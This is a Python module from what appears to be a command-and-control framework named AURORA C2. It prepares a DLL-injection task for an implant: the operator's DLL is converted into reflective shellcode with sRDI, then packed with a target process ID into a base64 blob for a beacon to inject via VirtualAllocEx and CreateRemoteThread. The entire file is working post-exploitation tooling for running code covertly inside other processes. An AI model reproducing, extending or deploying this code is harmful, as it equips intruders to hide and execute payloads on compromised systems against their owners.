"""
AURORA C2 - DLL/shellcode preparation for dllinject task.

Uses sRDI (Shellcode Reflective DLL Injection) to convert a standard
DLL into position-independent shellcode on the teamserver side, so
the beacon only needs VirtualAllocEx + CreateRemoteThread.

Blob format (all integers little-endian):
    [4-byte: inject_pid]
    [4-byte: flags]         sRDI flags (0 = default)
    [remaining: shellcode]  sRDI-converted shellcode bytes
"""
from __future__ import annotations

import base64
import struct
import sys
from pathlib import Path

# Add sRDI module to path
_SRDI_DIR = Path(__file__).resolve().parent / "srdi"
if str(_SRDI_DIR) not in sys.path:
    sys.path.insert(0, str(_SRDI_DIR))

from ShellcodeRDI import ConvertToShellcode, HashFunctionName, is64BitDLL  # noqa: E402


class DllParseError(Exception):
    pass


def _resolve_path(raw_path: str) -> Path:
    if not raw_path or "\x00" in raw_path:
        raise DllParseError("Invalid DLL path")
    p = Path(raw_path).expanduser()
    if not p.is_absolute():
        p = Path.cwd() / p
    return p.resolve()


def _split_args(args: str) -> list[str]:
    tokens: list[str] = []
    buf: list[str] = []
    quote: str | None = None
    for ch in args.strip():
        if quote:
            if ch == quote:
                quote = None
            else:
                buf.append(ch)
            continue
        if ch in ('"', "'"):
            quote = ch
            continue
        if ch.isspace():
            if buf:
                tokens.append("".join(buf))
                buf = []
            continue
        buf.append(ch)
    if quote:
        raise DllParseError("Unclosed quote in arguments")
    if buf:
        tokens.append("".join(buf))
    return tokens


def prepare_dllinject_task(args: str) -> tuple[str, str, dict[str, str | int]]:
    """Prepare a dllinject task.

    Args:
        args: "<pid> <dll_path> [export_function]"

    The DLL is converted to shellcode via sRDI on the teamserver side.
    If export_function is specified, sRDI will call that exported function
    after DllMain. Otherwise, only DllMain is called (functionHash=0).

    Returns:
        (task_args, display_args, meta) where task_args is base64 blob.
    """
    parts = _split_args(args or "")
    if len(parts) < 2:
        raise DllParseError("Usage: dllinject <pid> <dll_path> [export_function]")

    try:
        pid = int(parts[0])
    except ValueError:
        raise DllParseError("Invalid PID")
    if pid <= 0:
        raise DllParseError("PID must be positive")

    dll_path = _resolve_path(parts[1])
    if not dll_path.is_file():
        raise DllParseError(f"DLL file not found: {parts[1]}")

    raw_dll = dll_path.read_bytes()
    if len(raw_dll) > 10 * 1024 * 1024:
        raise DllParseError("DLL file exceeds 10 MB limit")

    # Verify it's a 64-bit DLL (beacon is x64)
    if not is64BitDLL(raw_dll):
        raise DllParseError("Only 64-bit DLLs are supported (beacon is x64)")

    # sRDI: convert DLL to shellcode
    export_function = parts[2] if len(parts) >= 3 else None
    if export_function:
        function_hash = HashFunctionName(export_function)
    else:
        function_hash = 0  # Only call DllMain

    flags = 0  # No special flags
    user_data = b""

    shellcode = ConvertToShellcode(raw_dll, function_hash, user_data, flags)
    if not shellcode:
        raise DllParseError("sRDI conversion failed")

    # Pack: [4-byte pid][4-byte flags][shellcode]
    blob = bytearray()
    blob += struct.pack("<I", pid)
    blob += struct.pack("<I", flags)
    blob += shellcode

    b64 = base64.b64encode(bytes(blob)).decode("ascii")

    display = f"{parts[0]} {parts[1]}"
    if export_function:
        display += f" {export_function}"

    meta = {
        "pid": pid,
        "dll_path": parts[1],
        "export_function": export_function or "",
        "shellcode_size": len(shellcode),
        "dll_size": len(raw_dll),
    }
    return b64, display, meta
